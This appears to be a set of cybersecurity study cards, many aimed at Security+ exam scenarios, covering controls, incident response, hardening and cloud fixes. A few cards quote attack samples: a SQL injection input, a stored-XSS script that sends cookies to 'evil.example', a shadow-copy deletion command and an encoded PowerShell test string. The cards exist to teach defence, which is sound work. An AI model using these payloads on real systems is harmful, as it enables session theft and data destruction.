cy-frameworks.title: Map one control across frameworks
cy-frameworks.code:
Need: multi-factor authentication for remote access

NIST CSF 2.0     PR.AA  (Identity Management, Authentication and Access Control)
ISO/IEC 27001    Annex A 5.17 Authentication information, 8.5 Secure authentication
CIS Controls v8  6.4 Require MFA for remote network access
PCI DSS v4.0     8.4.3 MFA for remote network access
cy-frameworks.explanation: One well-documented control can satisfy several frameworks at once. A mapping like this stops teams building the same control four times for four audits.

cy-soc.title: Tier 1 alert note
cy-soc.code:
Alert:     Impossible travel - j.smith (Lisbon 08:02, Singapore 08:40)
Checked:   Singapore IP = commercial VPN exit node; no MFA prompt logged
           j.smith's laptop shows Lisbon office Wi-Fi at 08:40
Verdict:   Likely token theft (session reuse without MFA)
Action:    Revoked sessions, reset password, escalated to Tier 2 (P2)
Ticket:    INC-48213
cy-soc.explanation: A good note records what was checked, the verdict and the action, so the next analyst can continue without redoing the work.

cy-web.title: SQL injection and the fix
cy-web.code:
# Vulnerable: input is pasted into the query text
q = "SELECT * FROM users WHERE name = '" + name + "'"
# name = "' OR '1'='1"  ->  returns every user

# Fixed: parameterised query; input is only ever data
cur.execute("SELECT * FROM users WHERE name = %s", (name,))
cy-web.explanation: Escaping and blocklists are fragile. Parameterised queries separate code from data, so no input can change the query's structure.

cy-ir-forensics.title: Order of volatility in practice
cy-ir-forensics.code:
1. CPU registers, cache        (gone in nanoseconds - rarely captured)
2. Memory, network connections (winpmem / netstat -ano)
3. Running processes           (EDR process tree)
4. Disk                        (forensic image via write-blocker)
5. Remote logs                 (SIEM, firewall)
6. Backups and archives
cy-ir-forensics.explanation: Collect the most volatile evidence first. Pulling the power cord before capturing memory destroys running malware, keys and network state.

cy-ad-cloud-attacks.title: Spotting Kerberoasting
cy-ad-cloud-attacks.code:
Event 4769 (Kerberos service ticket requested)
  Account:        jdoe
  Service:        MSSQLSvc/sql01.corp.local:1433
  Ticket enc:     0x17 (RC4-HMAC)
  ...repeated for 46 different service accounts in 2 minutes
cy-ad-cloud-attacks.explanation: One user requesting RC4 tickets for dozens of SPNs is a classic Kerberoasting pattern: the tickets are cracked offline. Defend with long gMSA passwords and AES-only encryption.

cy-threat-intel.title: From IOC to TTP
cy-threat-intel.code:
Pyramid of Pain
Hash values     d41d8cd9...        trivial for attacker to change
IP addresses    185.220.101.4      easy
Domain names    upd-check[.]net    simple
Artifacts       Run key 'Updater'  annoying
Tools           Cobalt Strike      challenging
TTPs            T1003.001 LSASS    tough - forces new tradecraft
cy-threat-intel.explanation: Blocking a hash costs the attacker a recompile; detecting LSASS memory access costs them their method. Prioritise intel you can turn into behavioural detections.

cy-detection-labs.title: A detection-as-code test
cy-detection-labs.code:
rule: encoded_powershell
test:
  given:  process.command_line = "powershell.exe -nop -enc SQBFAFgA"
  expect: alert
  given:  process.command_line = "powershell.exe -File backup.ps1"
  expect: no_alert
cy-detection-labs.explanation: Each rule ships with a malicious and a benign sample, so a change that breaks detection or floods analysts with false positives fails in CI, not in production.

cy-threat-actors.title: Profile an actor for your organisation
cy-threat-actors.code:
Actor type       Motive          Typical target        Relevance to a regional hospital
---------------  --------------  --------------------  --------------------------------
Ransomware crew  Money           Anyone who will pay   High
Nation state     Espionage       Research, government  Medium (clinical trial data)
Hacktivist       Ideology        Public-facing sites   Low-Medium
Insider          Money/grievance Own employer          Medium
cy-threat-actors.explanation: Threat modelling starts with who is likely to come for you and why; that, not headlines, decides where the budget goes.

cy-malware.title: Static triage of a sample
cy-malware.code:
$ sha256sum invoice.exe
7a1c...9e3f  invoice.exe          -> look up on VirusTotal
$ file invoice.exe
PE32 executable (GUI) Intel 80386  -> Windows binary despite 'invoice'
$ strings -n 8 invoice.exe | grep -Ei 'http|\.onion|vssadmin'
vssadmin delete shadows /all /quiet  -> ransomware behaviour
cy-malware.explanation: Hashing, file type and strings take a minute and need no execution. Deleting shadow copies is a strong ransomware indicator. Run anything further only in an isolated sandbox.

cy-vulns.title: Read a CVSS v3.1 vector
cy-vulns.code:
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H   = 9.8 Critical

AV:N  attack over the network
AC:L  no special conditions
PR:N  no account needed
UI:N  no user interaction
C/I/A:H  full compromise
cy-vulns.explanation: The vector tells you why it is critical: an unauthenticated network attacker gets full control. CVSS v4.0 is now published; read its vectors the same way, with added supplemental metrics.

cy-cloud-arch.title: Shared responsibility for one workload
cy-cloud-arch.code:
Workload: web app on IaaS VMs
Provider:  physical data centre, hosts, hypervisor, network fabric
Customer:  guest OS patching, firewall rules, IAM, app code, data, encryption keys

Same app on a managed PaaS service:
Provider adds: OS and runtime patching
Customer keeps: IAM, app code, data, configuration
cy-cloud-arch.explanation: Moving up the stack hands more layers to the provider, but identity, data and configuration always stay with the customer; most cloud breaches happen there.

cy-net-arch.title: Three-tier segmentation rules
cy-net-arch.code:
Zone      Allowed inbound from     Ports
--------  -----------------------  ---------
DMZ/web   Internet                 443
App       Web tier only            8443
DB        App tier only            5432
Mgmt      Admin jump host only     22, 3389
Default   deny all, log denies
cy-net-arch.explanation: Each tier talks only to its neighbour, so a compromised web server cannot reach the database directly. The default deny and logging make lateral movement visible.

cy-secure-proto.title: Insecure protocol replacements
cy-secure-proto.code:
Insecure   Port   Replace with        Port
---------  -----  ------------------  -----
Telnet     23     SSH                 22
FTP        21     SFTP / FTPS         22 / 990
HTTP       80     HTTPS (TLS 1.2+)    443
LDAP       389    LDAPS               636
SNMPv1/2c  161    SNMPv3 (authPriv)   161
POP3/IMAP  110/143 POP3S/IMAPS       995/993
cy-secure-proto.explanation: The legacy protocols send credentials in clear text. Their secure versions add encryption and authentication, usually on a different port.

cy-crypto.title: Hashing vs encryption vs signing
cy-crypto.code:
$ echo -n 'hello' | sha256sum
2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824   (one-way)

$ openssl enc -aes-256-gcm ...          # reversible with the key (confidentiality)
$ openssl dgst -sha256 -sign key.pem file  # private key signs, public key verifies (integrity + origin)
cy-crypto.explanation: Hashing proves content has not changed, encryption hides it, and a signature proves who produced it. Passwords are stored with slow salted hashes (Argon2id, bcrypt), never encrypted.

cy-concepts.title: Defence in depth around one asset
cy-concepts.code:
Asset: customer database
Policy     data classification, access reviews
Physical   badge-controlled data centre
Perimeter  firewall, WAF
Network    DB in isolated subnet
Host       hardened OS, EDR
App        parameterised queries, least-privilege DB user
Data       encryption at rest, column masking
cy-concepts.explanation: No single layer is perfect; an attacker who bypasses the WAF still meets least privilege and encryption.

cy-risk.title: Qualitative risk register entry
cy-risk.code:
Risk ID:     R-014
Scenario:    Ransomware encrypts file servers via phishing
Likelihood:  Likely (4/5)
Impact:      Major (4/5)          -> Inherent risk 16 (High)
Controls:    EDR, offline backups, phishing training
Residual:    Possible (3) x Moderate (3) = 9 (Medium)
Treatment:   Mitigate; owner CIO; review quarterly
cy-risk.explanation: The register records inherent risk, the controls and the residual risk, with an owner. Management then decides whether the residual is within appetite.

cy-governance.title: Policy, standard, procedure, guideline
cy-governance.code:
Policy      'All remote access must use MFA.'              (mandatory, high level)
Standard    'MFA must be FIDO2 or authenticator app.'      (mandatory, specific)
Procedure   '1. Open portal  2. Enrol key  3. Test ...'   (mandatory steps)
Guideline   'Keep a backup key in a safe place.'           (recommended)
cy-governance.explanation: Policies state intent and are approved by leadership; standards and procedures make them measurable; guidelines are advice.

secplus-soc-scenarios.title: Work a scenario question
secplus-soc-scenarios.code:
Scenario: Users report pop-ups; EDR shows many hosts
          contacting one new domain every 5 minutes.

Step 1  What is happening?   Beaconing -> likely C2
Step 2  What is asked?       'BEST first action'
Step 3  Eliminate:           re-image all (too early), ignore (wrong)
Step 4  Answer:              block the domain and isolate affected hosts
secplus-soc-scenarios.explanation: Identify the attack, then read exactly what the question asks: first, best or most likely. Containment usually comes before eradication.

secplus-hardening-vuln.title: Hardening a new Linux server
secplus-hardening-vuln.code:
apt update && apt upgrade -y                 # patch
systemctl disable --now telnet.socket cups   # remove unneeded services
sed -i 's/^#*PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config
sed -i 's/^#*PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config
ufw default deny incoming && ufw allow 22/tcp && ufw enable
systemctl restart ssh
secplus-hardening-vuln.explanation: Patch, remove what you do not need, require keys instead of passwords and default-deny the firewall. CIS Benchmarks give a full checklist.

secplus-secops-tooling.title: Which tool answers which question?
secplus-secops-tooling.code:
Question                                    Tool
------------------------------------------  ---------------------
What ports are open on this host?           nmap -sV 10.0.0.5
What is crossing the wire?                  tcpdump / Wireshark
Which known CVEs affect these hosts?        Vulnerability scanner
What happened across all systems at 02:00?  SIEM search
Is this file malicious?                     Sandbox / hash lookup
secplus-secops-tooling.explanation: Exam scenarios often describe the question and expect you to name the tool. Match the need to the data source.

secplus-ir-scenarios.title: NIST incident response phases on one case
secplus-ir-scenarios.code:
Preparation        EDR deployed, IR plan, contact list
Detection/Analysis SIEM alert: mass file renames on FS01
Containment        isolate FS01, disable compromised account
Eradication        remove malware, close the RDP exposure
Recovery           restore from offline backup, monitor
Lessons learned    MFA on RDP; update playbook
secplus-ir-scenarios.explanation: SP 800-61r3 now maps these activities to the CSF 2.0 functions, but the order of work in an incident is the same.

secplus-threat-scenarios.title: Name the attack from its signs
secplus-threat-scenarios.code:
Signs                                               Attack
--------------------------------------------------  ----------------------
Many accounts, one common password each             Password spraying
Breached user/pass pairs tried on our site          Credential stuffing
Visitor tailgates through a badge door              Piggybacking/tailgating
Legit site of a target industry is compromised      Watering hole
SMS asking to 'verify your bank account'            Smishing
secplus-threat-scenarios.explanation: Most scenario questions describe symptoms. Learn the distinguishing sign of each attack, such as one password across many accounts for spraying.

secplus-malware-scenarios.title: Malware types by behaviour
secplus-malware-scenarios.code:
Behaviour                                         Type
------------------------------------------------  -----------
Spreads by itself across the network              Worm
Looks like a useful app, hides a payload          Trojan
Encrypts files, demands payment                   Ransomware
Runs only when a condition (date, event) is met   Logic bomb
Hides itself and gives persistent admin access    Rootkit
Records keystrokes                                Keylogger
secplus-malware-scenarios.explanation: Self-propagation without user action is the key difference between a worm and a virus.

secplus-social-web-scenarios.title: Stored XSS and its fix
secplus-social-web-scenarios.code:
Comment saved:  <script>fetch('//evil.example/c?'+document.cookie)</script>
Every visitor's browser runs it and sends their cookie.

Fixes:
- Encode output: <script> is shown, not run
- Content-Security-Policy: script-src 'self'
- Session cookie flags: HttpOnly; Secure; SameSite=Lax
secplus-social-web-scenarios.explanation: Stored XSS runs for everyone who views the page. Output encoding is the primary fix; CSP and HttpOnly limit the damage if one slips through.

secplus-vuln-scenarios.title: Validate a scanner finding
secplus-vuln-scenarios.code:
Scanner: 'Apache 2.4.49 path traversal (CVE-2021-41773)' on 10.0.3.7
Check:   curl -sI http://10.0.3.7 | grep Server
         Server: nginx/1.24.0
Result:  false positive (wrong product); document and tune the plugin
secplus-vuln-scenarios.explanation: Verify before you escalate. Recording false positives and why stops the same finding consuming time every month.

secplus-cloud-scenarios.title: Fix a public S3 bucket
secplus-cloud-scenarios.code:
aws s3api put-public-access-block --bucket reports-prod \
  --public-access-block-configuration \
  BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true
aws s3api get-bucket-policy-status --bucket reports-prod
  { "PolicyStatus": { "IsPublic": false } }
secplus-cloud-scenarios.explanation: Block Public Access overrides ACLs and policies that would expose the bucket. New buckets have it on by default; enable it at the account level too.

secplus-netarch-scenarios.title: Place the controls in a network
secplus-netarch-scenarios.code:
Internet -> [Edge firewall] -> DMZ: [WAF] -> web servers
                           -> [Internal firewall] -> App VLAN -> DB VLAN
Inline IPS between edge and DMZ (blocks)
IDS on a SPAN port in the DB VLAN (alerts only)
NAC on access switches (802.1X)
secplus-netarch-scenarios.explanation: Inline devices (firewall, IPS, WAF) can block; out-of-band sensors (IDS) only see copies. NAC decides who gets on the network at all.

secplus-dataprotect-scenarios.title: Choose a data protection method
secplus-dataprotect-scenarios.code:
Need                                         Method
-------------------------------------------  ----------------------
Analysts need trends, not identities         Anonymisation / aggregation
Support sees only the last 4 card digits     Masking
Order system must not store card numbers     Tokenisation
Laptop may be stolen                         Full-disk encryption
Files leaving by email must be caught        DLP
secplus-dataprotect-scenarios.explanation: Pick the method by the use case: masking hides data on display, tokenisation removes it from a system, encryption protects it where it is stored.

secplus-resilience-scenarios.title: Backup types and restore steps
secplus-resilience-scenarios.code:
Sun full, Mon-Sat backups, failure on Thursday

Incremental: restore Sun full + Mon + Tue + Wed   (4 sets, fastest backups)
Differential: restore Sun full + Wed              (2 sets, faster restore)

3-2-1: 3 copies, 2 media types, 1 offsite (keep one copy offline/immutable)
secplus-resilience-scenarios.explanation: Incrementals copy changes since the last backup of any kind; differentials copy changes since the last full. The trade-off is backup time against restore time.

secplus-concepts-scenarios.title: Zero trust access decision
secplus-concepts-scenarios.code:
Request: contractor laptop -> HR app
Policy engine checks:
  identity      MFA-verified, contractor role
  device        managed? NO
  location      unusual country
  resource      HR app = sensitive
Decision (policy enforcement point): deny; offer VDI access instead
secplus-concepts-scenarios.explanation: Zero trust evaluates every request on identity, device posture and context, not on whether the user is 'inside' the network.

secplus-crypto-scenarios.title: Inspect a certificate
secplus-crypto-scenarios.code:
$ openssl s_client -connect example.com:443 -servername example.com </dev/null \
  | openssl x509 -noout -subject -issuer -dates -ext subjectAltName
subject=CN=example.com
issuer=C=US, O=Let's Encrypt, CN=R11
notAfter=Mar  3 12:00:00 2027 GMT
X509v3 Subject Alternative Name: DNS:example.com, DNS:www.example.com
secplus-crypto-scenarios.explanation: Browsers match the hostname against the SAN list, check the dates and chain the issuer to a trusted root. A mismatch or expired date triggers a warning.

secplus-risk-scenarios.title: Pick the risk response
secplus-risk-scenarios.code:
Situation                                              Response
-----------------------------------------------------  ---------
Buy cyber insurance for breach costs                   Transfer
Stop offering the risky legacy service                 Avoid
Add MFA to reduce account takeover                     Mitigate
Low-impact risk, control costs more than the loss      Accept
secplus-risk-scenarios.explanation: Each response is a business decision. Acceptance must be documented and owned; ignoring a risk is not acceptance.

secplus-governance-scenarios.title: Roles in data governance
secplus-governance-scenarios.code:
Role          Example               Responsibility
------------  --------------------  ------------------------------------
Data owner    VP of Sales           classifies data, approves access
Data custodian DBA team             backups, encryption, applies controls
Data steward  CRM data lead         quality and metadata
Controller    The company (GDPR)    decides why and how data is processed
Processor     Payroll provider      processes on the controller's behalf
secplus-governance-scenarios.explanation: Accountability sits with the owner and the controller; custodians and processors carry out their instructions.

secplus-thirdparty-scenarios.title: Vendor onboarding checklist
secplus-thirdparty-scenarios.code:
Due diligence     SOC 2 Type II report, pen test summary, breach history
Contract          MSA, SLA (99.9%), DPA, right to audit, breach notice within 72 h
Access            least privilege, named accounts, MFA, expiry date
Monitoring        annual review, questionnaire, security ratings
Exit              data return and certified deletion
secplus-thirdparty-scenarios.explanation: Third-party risk is managed across the whole lifecycle; the contract is where security requirements become enforceable.
